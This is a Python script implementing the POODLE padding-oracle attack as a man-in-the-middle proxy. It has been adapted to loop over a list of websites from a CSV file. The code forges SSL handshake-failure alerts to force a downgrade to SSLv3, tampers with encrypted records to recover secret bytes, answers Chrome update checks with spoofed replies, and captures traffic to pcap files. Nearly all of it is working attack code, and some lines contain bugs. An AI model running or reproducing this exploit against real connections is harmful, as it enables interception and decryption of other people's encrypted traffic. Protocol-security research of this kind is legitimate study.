#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
	Poodle  attack implementation
	Author: mpgn <martial.puygrenier@gmail.com>
	Created: 03/2018 - Python3
	License: MIT
'''

import binascii
import select
import socketserver

from scapy.all import *


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAJ = '\033[45m'
    BLUE = '\033[44m'
    ORANGE = '\033[43m'
    CYAN = '\033[46m'
    RED = '\033[41m'
    GREEN = '\033[42m'
    YELLOW = '\033[100m'


class Poodle():

    def __init__(self):
        self.length_block = 8
        self.length_block_found = False
        self.first_packet_found = False
        self.find_block_length = False
        self.first_packet = ''
        self.ssl_header = ''
        self.frame = ''
        self.data_altered = False
        self.decipherable = False
        self.count = 0
        self.decipher_byte = ""
        self.secret = []
        self.length_request = 0
        self.current_block = 1
        self.secret_block = []
        self.packet_count = 0
        self.downgrade = False
        self.autoDowngrade = False
        self.length_previous_block = 0
        self.completed = False

        self.applyBlock = False

    def exploit(self, content_type, version, length, data, request):
        # if data and the data is not a favicon check #7
        if content_type == 23 and length > 24 and length >= len(self.first_packet):
            print("exploit call")
            traffic.favicon = True
            # save the first packet, so we can generate a wrong HMAC when we want
            # TODO : remove this and just alter the last byte of the packet when length of the
            #       block is found
            if self.first_packet_found == False:
                self.first_packet = data
                self.ssl_header = struct.pack('>BHH', content_type, version, length)
                self.first_packet_found = True

            if length == 32:
                print("Packet with length 32 ignored, data: " + str(data));
            else:
                # find the length of a block and return an HMAC error when we find the length
                if self.find_block_length == True:
                    if poodle.find_size_of_block(length) == 1:
                        # print("Attempting to return 500 Internal server error")
                        # data = "HTTP/1.0 500 Internal Server Error\r\n\r\n"
                        # request.send(data.encode())
                        return (self.first_packet, self.ssl_header, True)

                # exploit exploit exploit
                if self.length_block_found == True:
                    self.data_altered = True

                    self.total_block = (len(data) / self.length_block) - 2
                    request = self.split_len(binascii.hexlify(data), 16)

                    request[-1] = request[self.current_block]
                    pbn = request[-2]
                    pbi = request[self.current_block - 1]
                    self.decipher_byte = chr((self.length_block - 1) ^ int(pbn[-2:], 16) ^ int(pbi[-2:], 16))
                    sys.stdout.write("\r[+] Sending request [%3d] \033[36m%3d\033[0m - Block %d/%d : [%*s]" % (
                        length, self.count, self.current_block, self.total_block, self.length_block,
                        ''.join(self.secret_block[::-1])))
                    sys.stdout.flush()
                    data = binascii.unhexlify(b''.join(request))

        return data, struct.pack('>BHH', content_type, version, length), False

    def decipher(self):
        self.completed = True
        self.secret_block.append(self.decipher_byte.encode("unicode_escape").decode("utf-8"))
        sys.stdout.write("\r[+] Sending request \033[36m%3d\033[0m - Block %d/%d : [%*s]" % (
            self.count, self.current_block, self.total_block, self.length_block, ''.join(self.secret_block[::-1])))
        sys.stdout.flush()
        if len(self.secret_block) == self.length_block and self.current_block < (self.total_block):
            print('')
            self.secret += self.secret_block[::-1]
            self.current_block = self.current_block + 1
            self.secret_block = []
        elif len(self.secret_block) == self.length_block and self.current_block == self.total_block:
            # stop the attack and go to passive mode
            self.secret += self.secret_block[::-1]
            self.secret_block = []
            poodle.length_block_found = False
            print('\nStopping the attack...')

    def decipher2(self):
        print(self.decipher_byte.encode("unicode_escape").decode("utf-8"))

    def split_len(self, seq, length):
        return [seq[i:i + length] for i in range(0, len(seq), length)]

    def find_size_of_block(self, length_current_block):
        print(str(length_current_block), str(self.length_previous_block),
              str(length_current_block - self.length_previous_block))
        if (length_current_block - self.length_previous_block) == 8 or (
                length_current_block - self.length_previous_block) == 16:
            print("CBC block size " + str(length_current_block - self.length_previous_block))
            self.length_block = length_current_block - self.length_previous_block
            return 1
        else:
            self.length_previous_block = length_current_block
        return 0


class Traffic():
    def __init__(self):
        self.protocol_all = {768: [' SSLv3.0 ', bcolors.RED], 769: [' TLSv1.0 ', bcolors.GREEN],
                             770: [' TLSv1.1 ', bcolors.GREEN], 771: [' TLSv1.2 ', bcolors.GREEN],
                             772: [' TLSv1.3 ', bcolors.GREEN]}
        self.protocol_current = ''
        self.protocol_current_color = bcolors.GREEN
        self.protocol_downgrade = 0
        self.protocol_autoDowngrade = 0
        self.favicon = False

    def info_traffic(self, color1, protocol, color2, status):
        print(''.rjust(
            int(columns) - 20) + color1 + bcolors.BOLD + protocol + color2 + bcolors.BOLD + status + bcolors.ENDC)


class ProxyTCPHandler(socketserver.BaseRequestHandler):
    """
    The proxy respond to the CONNECT packet then just forward SSL packet to the server
    or the client. When active mode is enabled, the proxy alter the encrypted data send
    to the serveur
    """

    def handle(self):

        print("handle call");

        # Connection to the secure server
        socket_server = socket.create_connection((serverIP, serverPort))
        print('Proxy is launched on {!r} port {}'.format("127.0.0.1", 4443))
        # input allow us to monitor the socket of the client and the server
        inputs = [socket_server, self.request]
        running = True
        connect = True
        isValid = True
        emptyByte = 0
        lastEmptyByte = 0
        while running:
            readable = select.select(inputs, [], [])[0]
            for source in readable:
                if source is socket_server:
                    # try:
                    data = socket_server.recv(1024)
                    # except socket.error as err:
                    #     break
                    # print('Server -> proxy -> client')
                    # print("Received: " + str(data));
                    if len(data) == 0:
                        running = False
                        break
                    (content_type, version, length) = struct.unpack('>BHH', data[0:5])

                    if poodle.data_altered == True:
                        poodle.count = poodle.count + 1
                        if content_type == 23:
                            # 23 -> Application data (no HMAC error)
                            poodle.decipher()
                            poodle.count = 0
                        # elif content_type == 21:
                        # 21 -> HMAC error
                        poodle.data_altered = False
                    poodle.packet_count += 1
                    if poodle.find_block_length == False and poodle.length_block_found == False and poodle.downgrade == False:
                        sys.stdout.write("\r[OK] -> packed send and receive %3s %s %s" % (
                            poodle.packet_count, ''.rjust(int(columns) - 56),
                            traffic.protocol_current_color + traffic.protocol_current + bcolors.BLUE + bcolors.BOLD + ' passive  ' + bcolors.ENDC))
                        # cursor at the end, tssss
                        sys.stdout.write("\r[OK] -> packed send and receive %3s" % (poodle.packet_count))
                        sys.stdout.flush()
                    if poodle.downgrade == True and traffic.protocol_current != ' SSLv3.0 ' and traffic.protocol_downgrade == 0:
                        print("Sending handshake failure")
                        self.request.send(binascii.unhexlify("15030000020228"))
                        traffic.protocol_downgrade = 1
                        poodle.downgrade == False
                    else:
                        # we send data to the client
                        self.request.send(data)

                elif source is self.request:
                    if connect == True:
                        """
                            This block of code is only ran once.
                            It attempts to check if this is an initial connection message and if it is, 
                            it pretends that the connection was successfully established.
                        """
                        # print('Client -> proxy')
                        data = self.request.recv(1024)
                        print("Received: " + str(data));
                        # print("Received: " + data.decode("utf-8"));
                        connect = False
                        # data = "HTTP/1.0 200 Connection established\r\n\r\n"
                        # self.request.send(data.encode())
                        if 'CONNECT' in str(data):
                            if serverDomain in str(data):
                                data = "HTTP/1.1 200 Connection established\r\n\r\n"
                                self.request.send(data.encode())
                                break
                            elif previousDomain in str(data):
                                # Tell client to move on
                                print("Previous domain detected")
                                isValid = False
                                self.request.close()
                                return
                            elif 'clients2.google.com' in str(data):
                                # Fix for Chrome's update checker
                                data = 'HTTP/1.1 200 Connection established\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><gupdate xmlns="http://www.google.com/update2/response" protocol="2.0" server="prod"><daystart elapsed_days="4371" elapsed_seconds="3642"/><app appid="hfnkpimlhhgieaddgfemjhofmfblmnib" cohort="1:jcl:" cohortname="Auto" status="ok"><updatecheck status="noupdate"/></app><app appid="hnimpnehoodheedghdeeijklkeaacbdc" cohort="" cohortname="" status="ok"><updatecheck status="noupdate"/></app><app appid="npdjjkjlcidkjlamlmmdelcjbcpdjocm" cohort="1:i2r:" cohortname="Win" status="ok"><updatecheck codebase="http://www.google.com/dl/release2/chrome_component/ANo3o4NBTqM-_101.3.33.21/101.3.33.21_win_ChromeRecovery.crx2" fp="2.101.3.33.21" status="ok"/></app></gupdate>'
                                self.request.send(data.encode())
                                print("Update check found")
                                isValid = False;
                                if poodle.applyBlock:
                                    self.request.close()
                                return
                            elif '47a654ab3ed56e097ec614d87f642f8f5375c7775f41b65fbac7a0575eec12fc' in str(data):
                                # move on
                                print(
                                    "Attack block received ===================================================================================\n")
                                poodle.find_block_length = False
                                poodle.length_block_found = True
                                poodle.downgrade = False
                                traffic.info_traffic(traffic.protocol_current_color, traffic.protocol_current,
                                                     bcolors.MAJ, '  active   ')
                                data = "HTTP/1.1 200 Connection established\r\n\r\n"
                                self.request.send(data.encode())
                                break
                            elif 'internalerror' in str(data):
                                # move on
                                print(
                                    "Received internal error ===================================================================================\n")
                                poodle.find_block_length = False
                                poodle.length_block_found = True
                                poodle.downgrade = False
                                traffic.info_traffic(traffic.protocol_current_color, traffic.protocol_current,
                                                     bcolors.MAJ, '  active   ')
                                data = "HTTP/1.1 507 Insufficient Storage\r\n\r\n"
                                self.request.send(data.encode())
                                break
                            else:  # Some other domain, don't give it to them.
                                data = "HTTP/1.1 404 Not Found\r\n\r\n"
                                self.request.send(data.encode())
                                print("isValid = false")
                                isValid = False
                                if poodle.applyBlock:
                                    self.request.close()
                                return
                    else:
                        # print('Client -> proxy -> server')
                        try:
                            # Attempt to decode the header of the message.
                            ssl_header = self.request.recv(5)
                            print("Header: " + str(ssl_header))
                        except struct.error as err:
                            print("Header error");
                            break
                        if ssl_header == '':
                            print("empty header");
                            running = False
                            break
                        try:
                            # Unpack header. > = define data as big endian. B = grab unsigned char. H = grab unsigned short.
                            (content_type, version, length) = struct.unpack('>BHH', ssl_header)
                            print("client -> server", str(content_type), str(version), str(length))
                            try:
                                # Cast version based on version (array notations defined above under class Traffic) traffic.protocol_all is the array.
                                traffic.protocol_current = traffic.protocol_all[version][0]
                                traffic.protocol_current_color = traffic.protocol_all[version][1]
                                if int(version) != 768:
                                    print("Warning: Protocol not SSLV3!")
                                    if traffic.protocol_downgrade == 0 and poodle.autoDowngrade == True:
                                        print("Attempting to automatically downgrade...")
                                        traffic.protocol_downgrade = 1
                            except KeyError as err:
                                # avoid error if the protocol is SSLv2.0
                                traffic.protocol_current = traffic.protocol_all[length][0]
                                traffic.protocol_current_color = traffic.protocol_all[length][1]
                        except struct.error as err:
                            # avoid error in chrome browser
                            return
                        if traffic.protocol_downgrade == 1 and content_type == 23:
                            traffic.info_traffic(traffic.protocol_current_color, traffic.protocol_current,
                                                 bcolors.YELLOW, ' downgrade ')
                            traffic.protocol_downgrade = 0
                        data = self.request.recv(length)
                        (data, ssl_header, error) = poodle.exploit(content_type, version, length, data, self.request)
                        if error:
                            stuff = 'HTTP/1.1 200 Connection established\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><gupdate xmlns="http://www.google.com/update2/response" protocol="2.0" server="prod"><daystart elapsed_days="4371" elapsed_seconds="3642"/><app appid="hfnkpimlhhgieaddgfemjhofmfblmnib" cohort="1:jcl:" cohortname="Auto" status="ok"><updatecheck status="noupdate"/></app><app appid="hnimpnehoodheedghdeeijklkeaacbdc" cohort="" cohortname="" status="ok"><updatecheck status="noupdate"/></app><app appid="npdjjkjlcidkjlamlmmdelcjbcpdjocm" cohort="1:i2r:" cohortname="Win" status="ok"><updatecheck codebase="http://www.google.com/dl/release2/chrome_component/ANo3o4NBTqM-_101.3.33.21/101.3.33.21_win_ChromeRecovery.crx2" fp="2.101.3.33.21" status="ok"/></app></gupdate>'
                            self.request.send(stuff.encode())
                        data_full = ssl_header + data
                        # we send data to the server
                        poodle.packet_count += 1
                        socket_server.send(data_full)
        return


class MyTCPHandler(socketserver.BaseRequestHandler):
    """
    The request handler class for our server.

    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the
    client.
    """

    def handle(self):
        # self.request is the TCP socket connected to the client
        self.data = self.request.recv(1024).strip()
        print("{} wrote:".format(self.client_address[0]))
        print(self.data)
        time.sleep(5)
        # just send back the same data, but upper-cased
        self.request.sendall(self.data.upper())


class Sniffer(Thread):
    def __init__(self, host, interface=None):
        super().__init__()

        self.daemon = True

        self.socket = None

        self.filters = "host " + str(host)

        self.interface = interface
        self.stop_sniffer = Event()
        self.num = 0

    def run(self):
        print("Run call")
        self.socket = conf.L2listen(
            type=ETH_P_ALL,
            iface=self.interface,
            filter=self.filters
        )
        print("Run middle")
        self.capture = sniff(
            # timeout=20,
            # count=1000,
            opened_socket=self.socket,
            prn=self.print_packet,
            stop_filter=self.should_stop_sniffer  # ,
            # store=0
        )
        print("Stop sniffing...")

    def join(self, timeout=None):
        self.stop_sniffer.set()
        super().join(timeout)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def print_packet(self, packet):
        ip_layer = packet.getlayer(IP)
        self.num = self.num + 1
        if self.num == 200:
            print("[!] New Packet: {src} -> {dst}".format(src=ip_layer.src, dst=ip_layer.dst))
            self.num = 0


if __name__ == '__main__':
    outputPrefix = "output"

    if len(sys.argv) < 2:
        print("Usage: python poodle-exploit-multiple.py <output>, using default output folder")
    elif len(sys.argv == 2):
        outputPrefix = str(sys.argv[1])
    else:
        exit()

    content = ""
    with open('ip-domain.csv', 'r') as content_file:
        content = content_file.read()

    websites = content.split("\n")

    i = 0
    failedWebsites = []
    serverDomain = "no-such-domain-exists-ignore-no-match-1clwishoawchneowahemlwaouxmoluqxhwaq88hwxn"
    while i < len(websites):
        websiteData = websites[i].split(",")
        print("Beginning with website: " + websiteData[0] + ", domain: " + websiteData[1] + ", IP: " + websiteData[2])

        previousDomain = serverDomain
        serverIP = websiteData[2]
        serverPort = 443
        serverDomain = websiteData[1]

        sniffer = Sniffer(serverIP)

        sniffer.start()

        # rows, columns = os.popen('stty size', 'r').read().split()
        rows = 50
        columns = 50
        # Create server and bind to set ip
        poodle = Poodle()
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer(("127.0.0.1", 4443), ProxyTCPHandler)
        proxy = threading.Thread(target=httpd.serve_forever)
        proxy.daemon = True
        proxy.start()
        # time.sleep(5)

        traffic = Traffic()

        print('Passive mode enabled by default')

        # print('\nType help to show all command line, ' + bcolors.BLUE + bcolors.BOLD + 'passive' + bcolors.ENDC + ' mode is by default enabled\n')
        # print(''.rjust(int(columns)-9) + bcolors.BLUE + bcolors.BOLD + ' passive ' + bcolors.ENDC)

        print("Starting in search mode...")
        poodle.find_block_length = True
        poodle.length_block_found = False
        poodle.downgrade = False
        traffic.info_traffic(traffic.protocol_current_color, traffic.protocol_current, bcolors.ORANGE, '  search   ')
        snifferCapture = False

        start_time = time.time()
        while True:
            try:
                time.sleep(1)
                sys.stdout.flush()
                # if snifferCapture == False and hasattr(sniffer, 'capture'):
                #     snifferCapture = True
                #     print("Sniffer capture property found")
                # if poodle.completed == True:
                #     print("1 byte decrypted, ending...")
                #     break
                if hasattr(sniffer, 'capture') or poodle.completed:
                    if not snifferCapture and hasattr(sniffer, 'capture'):
                        snifferCapture = True
                    if poodle.completed:
                        print("1 byte decrypted, ending...")
                    break
            except KeyboardInterrupt:
                print("Exiting...")
                print("Stopping proxy... bye bye")
                print("Failures: ")
                print(failedWebsites)
                exit()

        print("\n\033[32m{-} Deciphered plaintext\033[0m :", ('').join(poodle.secret))

        print("Stop sniffing...")
        sniffer.join(5.0)
        time.sleep(10)

        if not os.path.exists(outputPrefix):
            os.makedirs(outputPrefix)

        if hasattr(sniffer, 'capture'):
            filename = os.path.join(outputPrefix, websiteData[1] + "_" + datetime.datetime.now().strftime(
                "%Y-%m-%d_%H-%M-%S") + ".pcap")

            wrpcap(filename, sniffer.capture)

            if sniffer.isAlive():
                sniffer.socket.close()

        else:
            print("Failure: sniffer does not have capture property for " + websiteData[0] + " Skipping...")
            if snifferCapture == True:
                print("Hmmm?")
            failedWebsites.append(websiteData[0])

        i = i + 1

    print("Done. The following websites lacked capture property: ")
    print(failedWebsites)

    with open("poodle-exploit-multiple-failed_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".csv",
              'a+') as f:
        for i in range(0, len(failedWebsites)):
            f.write(failedWebsites[i]);
